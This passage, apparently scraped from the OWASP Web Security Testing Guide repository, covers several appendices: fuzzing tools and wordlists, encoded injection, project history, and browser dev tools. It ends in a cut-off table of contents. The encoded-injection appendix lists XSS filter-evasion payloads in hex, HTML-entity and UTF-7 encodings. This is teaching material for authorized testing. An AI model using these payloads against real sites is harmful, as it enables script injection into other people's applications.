-w endpoints.txt -u https://example.com\n```\n\nIn the above command `dir` specifies we are fuzzing a directory, `-u` is the flag for URL, and `-w` is the flag for wordlist where `endpoints.txt` is the wordlist file payloads will be taken from. The command runs concurrent requests to the endpoint to find available directories.\n\n### ZAP\n\n[ZAP](https://www.zaproxy.org) is a web application security scanner that can be used to find vulnerabilities and weaknesses in web applications. It also includes a [Fuzzer](https://www.zaproxy.org/docs/desktop/addons/fuzzer/).\n\nOne of the key features of ZAP is its ability to perform both passive and active scans. Passive scans involve observing the traffic between the user and the web application, while active scans involve sending test payloads to the web application to identify vulnerabilities.\n\n### Wordlists and References\n\nIn the examples above we have seen why we need a wordlist. Just wordlists are not enough, the wordlist must great for your fuzzing scenario. If you don't find any wordlists that match the necessary scenario then consider generating your own wordlist. Some popular wordlists and references are provided below.\n\n- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)\n- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)\n- [Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings)\n- [Bo0oM Fuzz List](https://github.com/Bo0oM/fuzz.txt)\n- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)\n- [bl4de Dictionaries](https://github.com/bl4de/dictionaries)\n- [Open Redirect Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)\n- [EdOverflow Bug Bounty Cheat Sheet](https://github.com/EdOverflow/bugbounty-cheatsheet)\n- [Daniel Miessler - SecLists](https://github.com/danielmiessler/SecLists)\n- [XssPayloads Twitter Feed](https://twitter.com/XssPayloads)\n- [XssPayloads List](https://github.com/payloadbox/xss-payload-list)\n", "timestamp": "2025-10-24T11:40:01.123770"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/D-Encoded_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md", "content": "# Encoded Injection\n\n## Background\n\nCharacter encoding is the process of mapping characters, numbers and other symbols to a standard format. Typically, this is done to create a message ready for transmission between sender and receiver. It is, in simple terms, the conversion of characters (belonging to different languages like English, Chinese, Greek or any other known language) into bytes. An example of a widely used character encoding scheme is the American Standard Code for Information Interchange (ASCII) that initially used 7-bit codes. More recent examples of encoding schemes would be the Unicode `UTF-8` and `UTF-16` computing industry standards.\n\nIn the space of application security and due to the plethora of encoding schemes available, character encoding has a popular misuse. It is being used for encoding malicious injection strings in a way that obfuscates them. This can lead to the bypass of input validation filters, or take advantage of particular ways in which browsers render encoded text.\n\n## Input Encoding – Filter Evasion\n\nWeb applications usually employ different types of input filtering mechanisms to limit the input that can be submitted by the user. If these input filters are not implemented sufficiently well, it is possible to slip a character or two through these filters. For instance, a `/` can be represented as `2F` (hex) in ASCII, while the same character (`/`) is encoded as `C0` `AF` in Unicode (2 byte sequence). Therefore, it is important for the input filtering control to be aware of the encoding scheme used. If the filter is found to be detecting only `UTF-8` encoded injections, a different encoding scheme may be employed to bypass this filter.\n\n## Output Encoding – Server & Browser Consensus\n\nWeb browsers need to be aware of the encoding scheme used to coherently display a web page. Ideally, this information should be provided to the browser in the HTTP header (`Content-Type`) field, as shown below:\n\n```http\nContent-Type: text/html; charset=UTF-8\n```\n\nor through HTML META tag (`META HTTP-EQUIV`), as shown below:\n\n``` html\n<META http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">\n```\n\nIt is through these character encoding declarations that the browser understands which set of characters to use when converting bytes to characters. Note that the content type mentioned in the HTTP header has precedence over the META tag declaration.\n\nCERT describes it here as follows:\n\nMany web pages leave the character encoding (`charset` parameter in HTTP) undefined. In earlier versions of HTML and HTTP, the character encoding was supposed to default to `ISO-8859-1` if it wasn't defined. In fact, many browsers had a different default, so it was not possible to rely on the default being `ISO-8859-1`. HTML version 4 legitimizes this - if the character encoding isn't specified, any character encoding can be used.\n\nIf the web server doesn't specify which character encoding is in use, it can't tell which characters are special. Web pages with unspecified character encoding work most of the time because most character sets assign the same characters to byte values below 128. But which of the values above 128 are special? Some 16-bit `character-encoding` schemes have additional multi-byte representations for special characters such as `<`. Some browsers recognize this alternative encoding and act on it. This is \"correct\" behavior, but it makes attacks using malicious scripts much harder to prevent. The server simply doesn't know which byte sequences represent the special characters.\n\nTherefore in the event of not receiving the character encoding information from the server, the browser either attempts to guess the encoding scheme or reverts to a default scheme. In some cases, the user explicitly sets the default encoding in the browser to a different scheme. Any such mismatch in the encoding scheme used by the web page (server) and the browser may cause the browser to interpret the page in a manner that is unintended or unexpected.\n\n### Encoded Injections\n\nAll the scenarios given below form only a subset of the various ways obfuscation can be achieved to bypass input filters. Also, the success of encoded injections depends on the browser in use. For example, `US-ASCII` encoded injections were previously successful only in IE browser but not in Firefox. Therefore, it may be noted that encoded injections, to a large extent, are browser dependent.\n\n### Basic Encoding\n\nConsider a basic input validation filter that protects against injection of single quote character. In this case the following injection would easily bypass this filter:\n\n``` html\n<script>alert(String.fromCharCode(88,83,83))</script>\n```\n\n`String.fromCharCode` JavaScript function takes the given Unicode values and returns the corresponding string. This is one of the most basic forms of encoded injections. Another vector that can be used to bypass this filter is:\n\n``` html\n<IMG src=\"\" onerror=javascript:alert(&quot;XSS&quot;)>\n```\n\nOr by using the respective [HTML character codes](https://www.rapidtables.com/code/text/unicode-characters.html):\n\n``` html\n<IMG src=\"\" onerror=\"javascript:alert(&#34;XSS&#34;)\">\n```\n\nThe above uses HTML Entities to construct the injection string. HTML Entities encoding is used to display characters that have a special meaning in HTML. For instance, `>` works as a closing bracket for a HTML tag. In order to actually display this character on the web page HTML character entities should be inserted in the page source. The injections mentioned above are one way of encoding. There are numerous other ways in which a string can be encoded (obfuscated) in order to bypass the above filter.\n\n### Hex Encoding\n\nHex, short for Hexadecimal, is a base 16 numbering system i.e it has 16 different values from `0` to `9` and `A` to `F` to represent various characters. Hex encoding is another form of obfuscation that is sometimes used to bypass input validation filters. For instance, hex encoded version of the string `<IMG SRC=javascript:alert('XSS')>` is\n\n``` html\n<IMG SRC=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29>\n```\n\nA variation of the above string is given below. Can be used in case ‘%’ is being filtered:\n\n``` html\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n```\n\nThere are other encoding schemes, such as Base64 and Octal, that may be used for obfuscation. Although, every encoding scheme may not work every time, a bit of trial and error coupled with intelligent manipulations would definitely reveal the loophole in a weakly built input validation filter.\n\n### UTF-7 Encoding\n\nUTF-7 encoding of\n\n``` html\n<SCRIPT>\n    alert(‘XSS’);\n</SCRIPT>\n```\n\nis as below\n\n`+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`\n\nFor the above script to work, the browser has to interpret the web page as encoded in `UTF-7`.\n\n### Multi-byte Encoding\n\nVariable-width encoding is another type of character encoding scheme that uses codes of varying lengths to encode characters. Multi-Byte Encoding is a type of variable-width encoding that uses varying number of bytes to represent a character. Multi-byte encoding is primarily used to encode characters that belong to a large character set e.g. Chinese, Japanese and Korean.\n\nMultibyte encoding has been used in the past to bypass standard input validation functions and carry out cross site scripting and SQL injection attacks.\n\n## References\n\n- [Encoding (Semiotics)](https://en.wikipedia.org/wiki/Encoding_(semiotics))\n- [HTML Entities](https://www.w3schools.com/HTML/html_entities.asp)\n- [How to prevent input validation attacks](https://searchsecurity.techtarget.com/answer/How-to-prevent-input-validation-attacks)\n- [Unicode and Character Sets](https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/)\n", "timestamp": "2025-10-24T11:40:01.183621"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/E-History.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/E-History.md", "content": "# History\n\nThe Testing Guide v4 was released in 2014. The Testing guide originated in 2003 with Dan Cuthbert as one of the original editors. It was handed over to Eoin Keary in 2005 and transformed into a wiki. From 2013 Andrew Muller co-lead the project with Matteo Meucci into 2018/2019. Point releases after v4 and the ramp toward v5 is being lead by Rick Mitchell and Elie Saad.\n\n- April, 2020: OWASP Testing Guide, Version 4.1\n- September, 2014: OWASP Testing Guide, Version 4.0\n- September, 2008: OWASP Testing Guide, Version 3.0\n- December, 2006: OWASP Testing Guide, Version 2.0\n- July, 2004: OWASP Web Application Penetration Checklist, Version 1.1\n- December, 2004: The OWASP Testing Guide, Version 1.0\n\n## Leaders\n\n- Matteo Meucci: OWASP Testing Guide Lead 2007-2020.\n- Andrew Muller: OWASP Testing Guide Lead 2013-2019.\n- Eoin Keary: OWASP Testing Guide Lead 2005-2007.\n- Daniel Cuthbert: OWASP Testing Guide Lead 2003-2005.\n\n## v4 Authors\n\n```html\n- Matteo Meucci          - Thomas Ryan       - Mike Hryekewicz  - Eduardo Castellano - Babu Arokiadas\n- Pavol Luptak           - Tim Bertels       - Simon Bennetts   - Simone Onofri      - Rob Barnes\n- Marco Morana           - Cecil Su          - Ray Schippers    - Harword Sheen      - Ben Walther\n- Giorgio Fedon          - Aung KhAnt        - Raul Siles       - Amro AlOlaqi       - Anant Shrivastava\n- Stefano Di Paola       - Norbert Szetei    - Jayanta Karmakar - Suhas Desai        - Colin Watson\n- Gianrico Ingrosso      - Michael Boman     - Brad Causey      - Ryan Dewhurst      - Luca Carettoni\n- Giuseppe Bonfà         - Wagner Elias      - Vicente Aguilera - Zaki Akhmad        - Eoin Keary\n- Andrew Muller          - Kevin Horvat      - Ismael Gonçalves - Davide Danelon     - Jeff Williams\n- Robert Winkel          - Tom Brennan       - David Fern       - Alexander Antukh   - Juan Manuel Bahamonde\n- Roberto Suggi Liverani - Tomas Zatko       - Tom Eston        - Thomas Kalamaris   - Thomas Skora\n- Tripurari Rai          - Juan Galiana Lara - Kevin Horvath    - Alexander Vavousis - Irene Abezgauz\n- Robert Smith           - Sumit Siddharth   - Rick Mitchell    - Christian Heinrich - Hugo Costa\n```\n\n## v4 Reviewers\n\n```html\n- Davide Danelon          - Andrea Rosignoli     - Irene Abezgauz\n- Lode Vanstechelman      - Sebastien Gioria     - Yiannis Pavlosoglou\n- Aditya Balapure\n```\n\n## v3 Authors\n\n```html\n- Anurag Agarwwal        - Giorgio Fedon        - Gianrico Ingrosso         - Mark Roxberry\n- Ferruh Mavituna        - Antonio Parata       - Andrew Van der Stock      - Marco Mella\n- Daniele Bellucci       - Adam Goodman         - Roberto Suggi Liverani    - Cecil Su\n- Kevin Horvath          - Marco Morana         - Harish Skanda Sureddy     - Pavol Luptak\n- Matteo Meucci          - Stefano Di Paola     - Christian Heinrich        - Marco Morana\n```\n\n## v3 Reviewers\n\n```html\n- Marco Cova            - Matteo Meucci         - Rick Mitchell\n- Kevin Fuller          - Nam Nguyen\n```\n\n## v2 Authors\n\n```html\n- Vicente Aguilera      - David Endler               - Matteo Meucci        - Anush Shetty\n- Mauro Bregolin        - Giorgio Fedon              - Marco Morana         - Larry Shields\n- Tom Brennan           - Javier Fernández-Sanguino  - Laura Nunez          - Dafydd Studdard\n- Gary Burns            - Andrew van der Stock       - Glyn Geoghegan       - Gunter Ollmann\n- Luca Carettoni        - Sebastien Deleersnyder     - Antonio Parata       - Ariel Waissbein\n- Dan Cornell           - Madhura Halasgikar         - Yiannis Pavlosoglou  - Jeff Williams\n- Mark Curphey          - Eoin Keary                 - Carlo Pelliccioni    - Tushar Vartak\n- Daniel Cuthbert       - David Litchfield           - Harinath Pudipeddi   - Tom Ryan\n- Stan Guzik            - Andrea Lombardini          - Alberto Revelli      - Claudio Merloni\n- Stephen DeVries       - Ralph M. Los               - Stefano Di Paola     - Mark Roxberry\n```\n\n## v2 Reviewers\n\n```html\n- Vicente Aguilera      - Mauro Bregolin          - Daniel Cuthbert       - Stefano Di Paola\n- Simona Forti          - Eoin Keary              - Katie McDowell        - Matteo Meucci\n- Antonio Parata        - Mark Roxberry           - Marco Belotti         - Marco Cova\n- Paul Davies           - Matteo G.P. Flora       - Darrell Groundy       - James Kist\n- Marco Mella           - Syed Mohamed A.         - Alberto Revelli       - Dave Wichers\n```\n", "timestamp": "2025-10-24T11:40:01.247512"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/F-Leveraging_Dev_Tools.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/F-Leveraging_Dev_Tools.md", "content": "# Leveraging Dev Tools\n\nThis appendix outlines various details for use of in browser Developer Tool functionality to aid in security testing activities.\n\nObviously in browser functionality is not a substitute for: DAST (Dynamic Application Security Testing) tools, SAST (Static Application Security Testing) tools, or a tester's experience, however, it can be leveraged for some testing activities and report production related tasks.\n\n## Accessing Dev Tools\n\nOpening Dev Tools can be accomplished in a number of ways.\n\n1. Via the keyboard shortcut `F12`.\n2. Via the keyboard shortcut `ctrl` + `shift` + `i` on Windows.\n3. Via the keyboard short cut `cmd` + `option` + `i` on Mac.\n4. Via the web page right-click context menu and then selecting `Inspect` in Google Chrome.\n5. Via the web page right-click context menu and then selecting `Inspect Element` in Mozilla Firefox.\n6. Via the triple dot 'kabob' menu in Google Chrome then selecting `More Tools` and then `Developer Tools`.\n7. Via the triple line 'hamburger' (or 'pancake') menu in Mozilla Firefox then selecting `Web Developer` and then `Toggle Tools`.\n\n> NOTE: The majority of the instructions below assume that Dev Tools is already open or active.\n\n## Capabilities\n\n| Functionality         | Chrome* | Firefox | Safari |\n|-----------------------|:-------:|:-------:|:------:|\n| User-Agent Switching  | Y       | Y       | Y      |\n| Edit/Resend Requests  | Y       | Y       | N      |\n| Cookie Editing        | Y       | Y       | N      |\n| Local Storage Editing | Y       | Y       | N      |\n| Disable CSS           | Y       | Y       | Y      |\n| Disable JavaScript    | Y       | Y       | Y      |\n| View HTTP Headers     | Y       | Y       | Y      |\n| Screenshots           | Y       | Y       | N      |\n| Offline Mode          | Y       | Y       | N      |\n| Encoding and Decoding | Y       | Y       | Y      |\n| Responsive Design Mode| Y       | Y       | Y      |\n\n`*` Anything that applies to Google Chrome should be applicable to all Chromium based applications. (Which includes Microsoft rebadging Edge around 2019/2020.)\n\n## User-Agent Switching\n\n### Related Testing\n\n- [Testing for Browser Cache Weaknesses](../4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md)\n\n### Google Chrome\n\n1. Click on triple dot 'kabob' menu on the right side of the Developer Tools pane, select `More tools` then select `Network conditions`.\n2. Un-check the \"Select automatically\" checkbox.\n3. Select the user agent from dropdown menu or enter a custom user agent\n\n![User-Agent selection dropdown menu in Google Chrome](images/f_chrome_devtools_ua_switch.png)\\\n*Figure 6.F-1: Google Chrome Dev Tools User-Agent Switching Functionality*\n\n### Mozilla Firefox\n\n1. Navigate to Firefox’s `about:config` page and click `I accept the risk!`.\n2. Enter `general.useragent.override` into the search field.\n3. Look for `general.useragent.override`, if you can't see this preference, look for one that show a set of radio buttons `Boolean, Number, String` select `String` then click the plus sign `Add` button on the `about:config` page.\n4. Set the value of `general.useragent.override` to whatever [User-Agent](https://developers.whatismybrowser.com/useragents/explore/) you might need.\n\n![User-Agent configuration preference in Mozilla Firefox](images/f_firefox_ua_switch.png)\\\n*Figure 6.F-2: Mozilla Firefox User-Agent Switching Functionality*\n\nLater click on the garbage can `Delete` button to the right of the `general.useragent.override` preference to remove the override and switch back to the default user agent.\n\n## Edit/Resend Requests\n\n### Related Testing\n\n- [Authentication Testing](../4-Web_Application_Security_Testing/04-Authentication_Testing/README.md)\n- [Authorization Testing](../4-Web_Application_Security_Testing/05-Authorization_Testing/README.md)\n- [Session Management Testing](../4-Web_Application_Security_Testing/06-Session_Management_Testing/README.md)\n- [Input Validation Testing](../4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md)\n- [Business Logic Testing](../4-Web_Application_Security_Testing/10-Business_Logic_Testing/README.md)\n\n### Mozilla Firefox\n\n1. Select the `Network` tab.\n2. Perform any action in the web application.\n3. Right-click on the HTTP request from the list and select `Edit and Resend`.\n4. Make desired modifications and click on the `Send` button.\n5. Right-click on the modified request and select `Open in New Tab`.\n\n### Google Chrome\n\n1. Select the `Network` tab.\n2. Perform any action in the web application.\n3. Right-click on the HTTP request from the list and select `Copy > Copy as fetch`.\n4. Paste the provided JavaScript code into the `Console` tab.\n5. Make any required modifications, and then hit enter to send the request.\n\n## Cookie Editing\n\n### Related Testing\n\n- [Authentication Testing](../4-Web_Application_Security_Testing/04-Authentication_Testing/README.md)\n- [Authorization Testing](../4-Web_Application_Security_Testing/05-Authorization_Testing/README.md)\n- [Session Management Testing](../4-Web_Application_Security_Testing/06-Session_Management_Testing/README.md)\n- [Testing for Cookie Attributes](../4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md)\n\n### Google Chrome\n\n1. Click the `Application` tab.\n2. Expand `Cookies` under the `Storage` heading.\n3. Select the relevant domain name.\n4. Double click in the `Value` column to edit any cookie value.\n\n> Note: Cookies can be deleted once selected by pressing the `delete` key, or from the right-click context menu.\n\n### Mozilla Firefox\n\n1. Click the `Storage` tab.\n2. Expand the `Cookies` section.\n3. Select the relevant domain name.\n4. Double click in the `Value` column to edit any cookie value.\n\n> Note: Cookies can be deleted once selected by pressing the `delete` key, or with various options from the right-click context menu.\n\n![Cookie Editing functionality in Mozilla Firefox](images/f_firefox_cookie_edit.png)\\\n*Figure 6.F-3: Mozilla Firefox Cookie Editing Functionality*\n\n## Local Storage Editing\n\n### Related Testing\n\n- [Testing Browser Storage](../4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md)\n\n### Google Chrome\n\n1. Click the `Application` tab.\n2. Expand `Local Storage` under the `Storage` heading.\n3. Select the relevant domain name.\n4. Double click in the `Value` column to edit any cookie value.\n5. Double click in the applicable Cell to edit the `Key` or `Value`.\n\n> Note: Editing `Session Storage` or `Index DB` follows essentially the same steps.\n>\n> Note: Items can be added or deleted via the right-click context menu.\n\n### Mozilla Firefox\n\n1. Click the `Storage` tab.\n2. Expand the `Local Storage` section.\n3. Select the relevant domain name.\n4. Double click in the applicable Cell to edit the `Key` or `Value`.\n\n> Note: Editing `Session Storage` or `Index DB` follows essentially the same steps.\n>\n> Note: Items can be added or deleted via the right-click context menu.\n\n## Disable CSS\n\n### Related Testing\n\n- [Testing for Client-side Resource Manipulation](../4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md)\n\n### General\n\nAll major browsers support manipulating CSS leveraging the Dev Tools Console and JavaScript functionality:\n\n- To remove all external style-sheets: `$('style,link[rel=\"stylesheet\"]').remove();`\n- To remove all internal style-sheets: `$('style').remove();`\n- To remove all in-line styles: `Array.prototype.forEach.call(document.querySelectorAll('*'),function(el){el.removeAttribute('style');});`\n- To remove everything from head tag: `$('head').remove();`\n\n## Disable JavaScript\n\n### Google Chrome\n\n1. Click on triple dot 'kabob' menu on the right side of the web developer toolbar and click on `Settings`.\n2. On the `Preferences` tab, under the `Debugger` section, check the `Disable JavaScript` checkbox.\n\n### Mozilla Firefox\n\n1. On the dev tools `Debugger` tab, click on the settings gear button in the upper right corner of the developer toolbar.\n2. Select `Disable JavaScript` from the dropdown (this is an enable/disable menu item; when JavaScript is disabled, the menu item has a check mark).\n\n## View HTTP Headers\n\n### Related Testing\n\n- [Information Gathering](../4-Web_Application_Security_Testing/01-Information_Gathering/README.md)\n\n### Google Chrome\n\n1. On the `Networking` tab in Dev Tools select any URL or request.\n2. In the lower right hand pane select the `Headers` tab.\n\n![Headers View in Google Chrome](images/f_chrome_devtools_headers.png)\\\n*Figure 6.F-4: Google Chrome Headers View*\n\n### Mozilla Firefox\n\n1. On the `Networking` tab in Dev Tools select any URL or request.\n2. In the lower right hand pane select the `Headers` tab.\n\n![Headers View in Mozilla Firefox](images/f_firefox_devtools_headers.png)\\\n*Figure 6.F-5: Mozilla Firefox Headers View*\n\n## Screenshots\n\n### Related Testing\n\n- [Reporting](../5-Reporting/README.md)\n\n### Google Chrome\n\n1. Press on the `Toggle Device Toolbar` button or press `ctrl` + `shift` + `m`.\n2. Click the triple dot 'kabob' menu in the Device Toolbar.\n3. Select `Capture screenshot` or `Capture full size screenshot`.\n\n### Mozilla Firefox\n\n1. Press the triple dot `ellipsis` button in the address bar.\n2. Select `Take a Screenshot`.\n3. Select either the `Save full page` or `Save visible` option.\n\n## Offline Mode\n\n### Google Chrome\n\n1. Navigate to `Network` tab.\n2. In the `Throttle` dropdown select `Offline`.\n\n![Offline Option in Google Chrome](images/f_chrome_devtools_offline.png)\\\n*Figure 6.F-6: Google Chrome Offline Option*\n\n### Mozilla Firefox\n\n1. From the triple line 'hamburger' (or 'pancake') menu select `Web Developer` and then `Work Offline`.\n\n![Offline Option in Mozilla Firefox](images/f_firefox_devtools_offline.png)\\\n*Figure 6.F-7: Mozilla Firefox Offline Option*\n\n## Encoding and Decoding\n\n### Related Testing\n\n- Many (perhaps even most) types of [Web Application Security Testing](../4-Web_Application_Security_Testing/README.md) can benefit from various types of encoding.\n\n### General\n\nAll major browsers support encoding and decoding strings in various ways leveraging the Dev Tools Console and JavaScript functionality:\n\n- base64 encode: `btoa(\"string-to-encode\")` & base64 decode: `atob(\"string-to-decode\")` - built-in JavaScript functions that are used to encode a string to base64 and decode a string from base64.\n- URL encode: `encodeURIComponent(\"string-to-encode\")` & URL decode: `decodeURIComponent(\"string-to-decode\")` - It encodes and decodes user-supplied input that will be used as a part of a URL, and it encodes all characters that have special meanings in a URL, including reserved characters.\n- URI encode: `encodeURI()` and URI decode: `decodeURI()` are functions used to encode and decode a complete URI, such as query parameters, path segments, or fragments, including special characters but excluding the reserved characters such as `:/?#[]@!$'()*+,;=` which have special meanings in a URL.\n\n## Responsive Design Mode\n\n### Related Testing\n\n- [Testing for Browser Cache Weaknesses](../4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md)\n- [Testing for Weaker Authentication in Alternative Channel](../4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md)\n- [Testing for Clickjacking](../4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md)\n\n### Google Chrome\n\n1. Click the `Toggle device toolbar` button or press `ctrl` + `shift` + `m`.\n\n![Responsive Design Mode in Google Chrome](images/f_chrome_responsive_design_mode.png)\\\n*Figure 6.F-8: Google Chrome Responsive Design Mode*\n\n### Mozilla Firefox\n\n1. Click the `Responsive Design Mode` button or press `ctrl` + `shift` + `m`.\n\n![Responsive Design Mode in Mozilla Firefox](images/f_firefox_responsive_design_mode.png)\\\n*Figure 6.F-9: Mozilla Firefox Responsive Design Mode*\n\n## References\n\n- [Web App Security Testing with Browsers](https://getmantra.com/web-app-security-testing-with-browsers/)\n- [Black Hills Information Security - Webcast: Free Tools! How to Use Developer Tools and JavaScript in Webapp Pentests](https://www.blackhillsinfosec.com/webcast-free-tools-how-to-use-developer-tools-and-javascript-in-webapp-pentests/)\n- [Greg Malcolm - Chrome Developer Tools: Raiding the Armory](https://github.com/gregmalcolm/wacky-wandas-wicked-weapons-frontend/blob/fix-it/README.md)\n- [List of UserAgent Strings](https://techblog.willshouse.com/2012/01/03/most-common-user-agents/)\n", "timestamp": "2025-10-24T11:40:01.324271"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/README.md", "content": "# Appendix\n\nAppendix A. [Testing Tools Resource](A-Testing_Tools_Resource.md)\n\nAppendix B. [Suggested Reading](B-Suggested_Reading.md)\n\nAppendix C. [Fuzzing](C-Fuzzing.md)\n\nAppendix D. [Encoded Injection](D-Encoded_Injection.md)\n\nAppendix E. [History](E-History.md)\n\nAppendix F. [Leveraging Dev Tools](F-Leveraging_Dev_Tools.md)\n", "timestamp": "2025-10-24T11:40:01.379658"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/README.md", "content": "# Table of Contents\n\n## 0. [Foreword by Eoin Keary](0-Foreword/README.md)\n\n## 1. [Frontispiece](1-Frontispiece/)\n\n## 2. [Introduction](2-Introduction/)\n\n### 2.1 [The OWASP Testing Project](2-Introduction/README.md#The-OWASP-Testing-Project)\n\n### 2.2 [Principles of Testing](2-Introduction/README.md#Principles-of-Testing)\n\n### 2.3 [Testing Techniques Explained](2-Introduction/README.md#Testing-Techniques-Explained)\n\n### 2.4 [Manual Inspections and Reviews](2-Introduction/README.md#Manual-Inspections-and-Reviews)\n\n### 2.5 [Threat Modeling](2-Introduction/README.md#Threat-Modeling)\n\n### 2.6 [Source Code Review](2-Introduction/README.md#Source-Code-Review)\n\n### 2.7 [Penetration Testing](2-Introduction/README.md#Penetration-Testing)\n\n### 2.8 [The Need for a Balanced Approach](2-Introduction/README.md#The-Need-for-a-Balanced-Approach)\n\n### 2.9 [Deriving Security Test Requirements](2-Introduction/README.md#Deriving-Security-Test-Requirements)\n\n### 2.10 [Security Tests Integrated in Development and Testing Workflows](2-Introduction/README.md#Security-Tests-Integrated-in-Development-and-Testing-Workflows)\n\n### 2.11 [Security Test Data Analysis and Reporting](2-Introduction/README.md#Security-Test-Data-Analysis-and-Reporting)\n\n## 3. [The OWASP Testing Framework](3-The_OWASP_Testing_Framework/)\n\n### 3.1 [The Web Security Testing Framework](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md)\n\n### 3.2 [Phase 1 Before Development Begins](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#Phase-1-Before-Development-Begins)\n\n### 3.3 [Phase 2 During Definition and Design](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#Phase-2-During-Definition-and-Design)\n\n### 3.4 [Phase 3 During Development](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#Phase-3-During-Development)\n\n### 3.5 [Phase 4 During Deployment](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#Phase-4-During-Deployment)\n\n### 3.6 [Phase 5 During Maintenance and Operations](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#Phase-5-During-Maintenance-and-Operations)\n\n### 3.7 [A Typical SDLC Testing Workflow](3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md#A-Typical-SDLC-Testing-Workflow)\n\n### 3.8 [Penetration Testing Methodologies](3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md)\n\n## 4. [Web Application Security Testing](4-Web_Application_Security_Testing/)\n\n### 4.0 [Introduction and Objectives](4-Web_Application_Security_Testing/00-Introduction_and_Objectives/README.md)\n\n### 4.1 [Information Gathering](4-Web_Application_Security_Testing/01-Information_Gathering/README.md)\n\n#### 4.1.1 [Conduct Search Engine Discovery Reconnaissance for Information Leakage](4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md)\n\n#### 4.1.2 [Fingerprint Web Server](4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md)\n\n#### 4.1.3 [Review Webserver Metafiles for Information Leakage](4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md)\n\n#### 4.1.4 [Enumerate Applications on Webserver](4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md)\n\n#### 4.1.5 [Review Web Page Content for Information Leakage](4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md)\n\n#### 4.1.6 [Identify Application Entry Points](4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md)\n\n#### 4.1.7 [Map Execution Paths Through Application](4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application.md)\n\n#### 4.1.8 [Fingerprint Web Application Framework](4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md)\n\n#### 4.1.9 [Fingerprint Web Application](4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application.md)\n\n#### 4.1.10 [Map Application Architecture](4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md)\n\n### 4.2 [Configuration and Deployment Management Testing](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README.md)\n\n#### 4.2.1 [Test Network Infrastructure Configuration](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md)\n\n#### 4.2.2 [Test Application Platform Configuration](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md)\n\n#### 4.2.3 [Test File Extensions Handling for Sensitive Information](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)\n\n#### 4.2.4 [Review Old Backup and Unreferenced Files for Sensitive Information](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md)\n\n#### 4.2.5 [Enumerate Infrastructure and Application Admin Interfaces](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md)\n\n#### 4.2.6 [Test HTTP Methods](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md)\n\n#### 